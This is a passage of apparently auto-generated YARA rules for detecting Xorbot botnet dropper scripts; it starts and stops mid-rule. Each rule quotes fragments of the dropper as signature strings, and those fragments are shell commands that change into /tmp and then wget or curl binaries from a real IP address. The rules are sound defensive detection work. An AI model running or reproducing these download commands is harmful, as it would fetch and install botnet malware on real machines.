      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/H66yYprcFgbHnpgETgIE5ZI4uOtcI7HK0U; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ISScjwTKiVCysfSQPJbLxJKYaY3SAQfrqc; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JqsAaYNlwcZm79putGaJQ0uVkHsrNdhIX3; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Rf9jPhnhhE5FnSQIa6GwRQxwWzZeQX7W0h; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TaxCSnRW8vxZU634SWHtrjvJlTRC2lZ5X6; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Z8IWHp5KuN7chYW39sFTc7zzutB3REkyej; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/9E6NXF9JmaIxL3mH8JRePiGwSVynBZ7D3H; curl -O  http://178.16.54.252/bins/9E6NXF9JmaIxL3mH8JRePiGwSV" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__0ca00804 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_0ca00804.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0ca00804e6e734d42b74a2f859d2b7b554651e5c47db01d8378a91ea510bae9d"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/newuJ3UQfZ4XJGfyj6LVDGB7Ti8DkbAEgW; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gfElAWgAg5w3jgr6TMXVHIZzonBlSbtkbF; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SXsOCb6nVgdOs7iFeoCyezmMTPFzvNEbhv; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7KiTiIDyXJWlUQ9fxLp4JdJyNg9k5N3ZnO; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fQoT0IUOBhweSXdfslCWsRYVd7KAEyjMAl; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MEBQLUV1sCNbV93QjfUb34dkb2uSSC1XFP; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lPXT5HlAyD7ZIebbYQY2ZhyVzcJnyYkFOC; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zMnYHQ4HvXsYqWAtGfx7AuRQDSQvrjj4o7; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zcyUPHmNGwR5ZP9iO8CjZaTZn4WI4XZdfC; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5asELMq6IobD58jDfv3K2VZbQ1ivxdeG0b; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WKbrDepyFWolPnsEEeBy4kJicWmFh5QmAX; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/y6D13JaeL06e05EptIOF5LRGwErxXqzybO; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lyleOapfUb9IliYQWq718kgieXxk2F5bZh; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Mm6GYoeGGIK4SGUUjBIpTat0PJH9FXlYIO; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/y6D13JaeL06e05EptIOF5LRGwErxXqzybO; curl -O  http://178.16.54.252/bins/y6D13JaeL06e05EptIOF5LRGwE" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__1fba2f40 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_1fba2f40.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1fba2f40f8cdbece9b630a9aca4d8bfa654d3aa8a60240ecf70e9c1db0577d6a"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oyVWdNmajIZNf2GLYzD2gLSusDfQ88mSxt; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1nl150WUPA8bXahSukhXeMCS4krx3uy4Rb; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oLyhA6GEYmW6gkEORdQW6kGa4rAiLAo0ky; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/QvMsFfhR9V3sAOW6ZMjsBwjdJkRuXHwNeA; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/HhdKUPCZipxSVWOZ5iMqdLcG9Vqi54z8pd; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xVyBjbGuKp5OtVLViJ7rtxmtxA7lPtYYUr; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ZnIA0gKd0ukVaBCzwSLHdW3MZRMCy3ZTMZ; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jlxGwUOMRTMIObq0jSWOaxNYDawMRiGmOn; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/17mL3ckDhdSnbywYcEITYundEtdLJJLSnk; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XRiBEuQJsl0j2ZQweJwMPUHJWgBdQZk7zT; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/puU5dTjfWzoIS0y2T9DfPPwEofhHE2laLR; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/amH3529IZq4BRrRTYctOV04V9H94PqFrKB; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/85CWmt7iuFDpJjjjYJJeH0gdg7ECqvJKaK; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xTvttm4jgVWPVKazXZ8cKTjemRJl1A9DUd; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/ZnIA0gKd0ukVaBCzwSLHdW3MZRMCy3ZTMZ; curl -O  http://178.16.54.252/bins/ZnIA0gKd0ukVaBCzwSLHdW3MZR" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__453aa64c {
   meta:
      description = "_subset_batch - file Xorbot(signature)_453aa64c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "453aa64cc4f0a780b23c9726b8c0a4e1495e2dd3056fd2f860447f170dfc5f54"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uNfBjeiUG6WIDymV7fqEj2CI8hg3DjGdGf; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/imq6SW5ekEQQbvsqOS5WUBn1FFDjM6vWBS; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wufnJvveJjNy5CYQAjUyOMG74JRfJWoQcr; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/THehxv8L68aQvYSPr0V5JMtdxqukgggeqx; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vxPotZs2eoT2A9V4NOo2And0BKicX6SHJj; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2proluOzEgnigCr8KZMhjG3s6VhFfUKRIt; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LRxWSFN5NveKLMWR5yiWyNet9MLCPLypZC; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qoA6mmYuvNqPhz2n1cr7a3agUEF6HKuORy; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hMs0C9VQWfrMibiDnLgP1T5V0JRKk38OB6; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XqX4wLVtkaOyH0XyljTfg0tMGfToPpIihr; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5DR2rLFWS8hpQ15n1lHhQpOeaoUE3aRngW; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/arvezy4clzvWDbva64OrYTVbbcvbs8NYbr; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GR7kF8WBE9DNm3TpkLhaAXsuatOZS1SI9f; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GR7kF8WBE9DNm3TpkLhaAXsuatOZS1SI9f; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2proluOzEgnigCr8KZMhjG3s6VhFfUKRIt; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__63ca86a8 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_63ca86a8.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "63ca86a8ed88f82eacad91d7e16454e7ee0a1384098b9e3a4641c14baa54debf"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iiBPwiArAtsjB5GkZe78YXXGm2Fw3twI2u; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/s52GCFjoUiOyb0KtK3xuYlaKkYUcbjWLSY; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/W72WwxcF4YE3X8Fb5pCFHsNoi5Ey3FCWYU; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GcDhgnsgWpiNmLSoppTvpsTgi2RaazS2eC; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WZTJzwFDVCFcbzsF01QLoO3EVegf73aaSz; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/HYekDQP8Fq15xUMRLWozJwGMz1XGQOVrdG; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BQ07SzW8u0MZmGqguZlLwpBZxFYmi94KXS; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yiqAVpC165JzJUtfbXUM1xvCcVLZ8qI2ms; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sE4azLyu5itm4xcKBMEr6LOWEfsq8hLxRI; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vUsV85aeE6dk8hpW0vLPaoVHbbW88gvfuZ; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vTRBVoESvr62s4RxpFvwiSBouWePIBDQfm; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RbkX1D88jFJWoNh3oaohowuq4zziE2aJdk; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/esT0ZviJFwXMsIrYAazWVSMLiOZcljMLbI; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vUsV85aeE6dk8hpW0vLPaoVHbbW88gvfuZ; curl -" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/WZTJzwFDVCFcbzsF01QLoO3EVegf73aaSz; curl -O  http://178.16.54.252/bins/WZTJzwFDVCFcbzsF01QLoO3EVe" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__6dc9ea1d {
   meta:
      description = "_subset_batch - file Xorbot(signature)_6dc9ea1d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6dc9ea1dee42b0593b713647fd8a5d4faef4d4773887b00cd2ac435dc46ae2ee"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ijnfVAKwVHy13Q9FBpngnYB5fKhtw2N433; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/J7Ui2GvIE7EL9ZSq6BA1vsJo47dnXz3cDL; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fEKnyWxljTl0NGDObrrjWLKoIzYaEqth7k; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aDS6fiqk6dZlLAwBLR6WsHSfRXFDmoTcpn; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pGFuyjKYGjUztr3dVNrJvy0OycurGOF052; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Mz3GaBfIC333Im73Oe4AiZEo2S8coRz0lv; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/APmSCk9xpqd3S9orcqAfQ1fNxzvpwv2Db6; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/V1fuk3tcEUqbCtrYVR5oSbSfC9OVlfQpsX; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x1fgxvnlILE8TXEOXOIib8C1gvKqnhLzt3; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/n9U0Eo0QpNJLHwYPcc7E8tGgQsRQiguDnj; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sWXIfGrJLvOeGKcPsTZQ61Q7iH5mAiXepy; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GZmzbXERihvgkLRfA5o4ywl5XPjWJ5JN1W; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oyzGd6wf5S73Qqz1MHLqze3r4fjpE5GygX; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/w416Uor4SK0lZfQ1XmRcf9xcngTDYTviYP; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x1fgxvnlILE8TXEOXOIib8C1gvKqnhLzt3; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__6e78a7fa {
   meta:
      description = "_subset_batch - file Xorbot(signature)_6e78a7fa.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e78a7fac4883c326256ee9bd7e9254c6806db6c10ee5c13ccd23b33b517b9d3"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/881shwpcPxECqXSZ6nRzZAH6CdJSSI7l9s; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Rt1Q119u8fiKPyb0fFqeOZKBRo9fmDbVAY; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nicBgPKslnKo5DaMK9w9ZGRnzQFXeV1ylm; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ug47mpQGUXtFjle5nXbEtTFTliswzoqThg; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cJIL1glwxStm9BUEQ5GF04U5z4vwj7jCyE; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/O0pcs5wxv5PFkP8f8Df48qBBUi5KIKrZ7S; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/KuZ8sV0YobnvKqikDsN09IY2DJf4YERVxu; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YPb7ffpxRYeXn4fNvRBdjXRG66knxqrtbc; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/O0tTY6WgrIkPlR1ejv64VG8ItTPa9LSzO8; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pju8w8dhOZ3ewkdOIJxolrjmbvQldabF3k; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hBNvg9uB6XL6A9TwQ1mTEBM1GJDs8j7zTa; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/M5Rd85DGmkUCfniWC6LdgyIGOZ7O5JtdFK; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FNF2LxqUp12JkT7foiy2l778sAWZ9AoPxC; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UQaueOrK21ncoLjJfhG7YRegqDiWgD2YPN; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/KuZ8sV0YobnvKqikDsN09IY2DJf4YERVxu; curl -O  http://178.16.54.252/bins/KuZ8sV0YobnvKqikDsN09IY2DJ" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__75dbbf7c {
   meta:
      description = "_subset_batch - file Xorbot(signature)_75dbbf7c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "75dbbf7c5a57e4872ad5bbc4609db93a57021c8fde19a500965dbe8a86e2e3a4"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bjxYMg1NBb1M5yl58iq58LeOIgUSgXy5yT; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qI1mOFbLwxeIXNyNzWXJZkCleAWyodJjP5; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/N18jU6eExPRDZvzqN9MtHt4RFSdL0otz7F; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/rAl0yhu243SRGXY6JQ6JOBYmhmVZ4MfbVv; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zVwpnbCEQWcC0jwPm8eRgM0WamEORBSUnO; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PBo10FMN1FemiHe4FC2nUkGnLjsDjZDeWN; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x7QCMYNvpzU8oDBRrVsqDmIv7vM7R7PNvK; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/NmDXN3RERNMf3wehUhKNVNP24FOMNOH2FT; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yfDjjJSaLpqPkuqhNmem8na4XKXJEj2Ji7; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/usLz78nMXpusLwCeV1mt293Anu2ET35cG9; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/derlxqGjFgOZ6RQXAPfhlfZy2cFRh4O3bP; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8ntobOPGULv5EONYK7lpTT44b8qLkBShRd; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6YrP49pUJu0SJZkAljPdIOYWYcpXj4Qlz2; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zVwpnbCEQWcC0jwPm8eRgM0WamEORBSUnO; curl -" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/derlxqGjFgOZ6RQXAPfhlfZy2cFRh4O3bP; curl -O  http://178.16.54.252/bins/derlxqGjFgOZ6RQXAPfhlfZy2c" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__a0a54c32 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_a0a54c32.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a0a54c329711a2256a29575165799da23c15bd2a32e076c787b4bdac9eb3c8ce"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/DC0TYudnZ7EzJ4DLBi4Vy7jE74zXmP6A02; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/o7AXLBbs7KW8GMTRqmfiHTctBD5tL9IV4S; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/AfuY6I4AFCXbZE4CCZCBg8JkkvwEqepeNo; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PLZh2lg1Ostl7iHqWsyaBk9HWikhIGKkKI; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3oJ6uEHQy5jRztuO12w5ZkYGAxcMtLdd3N; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yUvzZMplHdaE2It5mIsyAskREVzkFiXPe4; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/1WegPQcUIa4m3p1APEljCKCzbNtkTr9Ilx; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/jdfF3DGxB5MKdjWtHJMOFwqmKqJtYgEDlP; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lR1GcVTANi1xRlCkZqJi1UfF5NaHvNNtfP; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vCGYGc59FL3z863Bx3tMUZlDTaPx6HpKyN; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/FG1heV2VB1Bxx2q4QjlaR78Io8eFy4NHSY; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GTmpamH8WUAr8Znq27GtptQLc5FSLQiMDE; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Yxy7P3ZRW8L3DhiO6CXcvXLQF5xzg4yAdR; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9AOAsZYJ6NWy3fVVtyghhBgYQwYu5RuPGl; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/PLZh2lg1Ostl7iHqWsyaBk9HWikhIGKkKI; curl -O  http://178.16.54.252/bins/PLZh2lg1Ostl7iHqWsyaBk9HWi" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__cb9759f6 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_cb9759f6.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
